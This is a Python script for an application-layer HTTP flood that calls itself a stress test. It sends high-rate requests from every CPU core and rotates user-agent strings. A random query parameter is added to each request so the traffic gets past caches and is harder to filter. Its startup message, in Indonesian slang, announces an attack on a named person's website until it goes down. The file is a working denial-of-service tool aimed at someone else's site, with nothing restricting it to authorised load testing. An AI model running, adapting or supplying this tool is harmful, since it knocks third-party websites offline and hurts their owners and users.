import argparse
import asyncio
import httpx
import random
import string
import time
import multiprocessing as mp

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) Gecko Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
]

def random_query():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

async def send_request(client, url):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    target_url = url + ("&q=" if "?" in url else "?q=") + random_query()
    start = time.perf_counter()
    try:
        resp = await client.get(target_url, headers=headers, timeout=5.0)
        return True, time.perf_counter() - start
    except Exception:
        return False, 0

async def stress_worker(url, duration, rps, queue):
    success, fail = 0, 0
    response_times = []
    start = time.time()
    delay = 1.0 / rps if rps > 0 else 0

    async with httpx.AsyncClient() as client:
        while time.time() - start < duration:
            ok, elapsed = await send_request(client, url)
            if ok:
                success += 1
                response_times.append(elapsed)
            else:
                fail += 1
            if delay:
                await asyncio.sleep(delay)

    # send results back to parent
    queue.put((success, fail, response_times))

def worker_entry(url, duration, rps, queue):
    asyncio.run(stress_worker(url, duration, rps, queue))

def run_multiprocess(url, duration, total_rps):
    cpu_count = mp.cpu_count()
    per_process_rps = total_rps // cpu_count
    queue = mp.Queue()
    procs = [
        mp.Process(target=worker_entry, args=(url, duration, per_process_rps, queue))
        for _ in range(cpu_count)
    ]
    for p in procs: p.start()
    for p in procs: p.join()

    total_success, total_fail, all_times = 0, 0, []
    while not queue.empty():
        s, f, times = queue.get()
        total_success += s
        total_fail += f
        all_times.extend(times)

    print("\n=== Stress Test Results ===")
    print(f"Total Requests: {total_success + total_fail}")
    print(f"  Success: {total_success}")
    print(f"  Failures: {total_fail}")
    if all_times:
        print(f"  Avg Response Time: {sum(all_times)/len(all_times):.3f} sec")
        print(f"  Max Response Time: {max(all_times):.3f} sec")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-d", "--duration", type=int, default=30)
    parser.add_argument("-r", "--rps", type=int, default=1000, help="Total requests per second")
    args = parser.parse_args()

    print(f"Serang rohit ireng webnya sampe ireng {args.url}")
    print(f"Duration: {args.duration}s, Target RPS: {args.rps}, CPU workers: {mp.cpu_count()}")
    run_multiprocess(args.url, args.duration, args.rps)

if __name__ == "__main__":
    main()
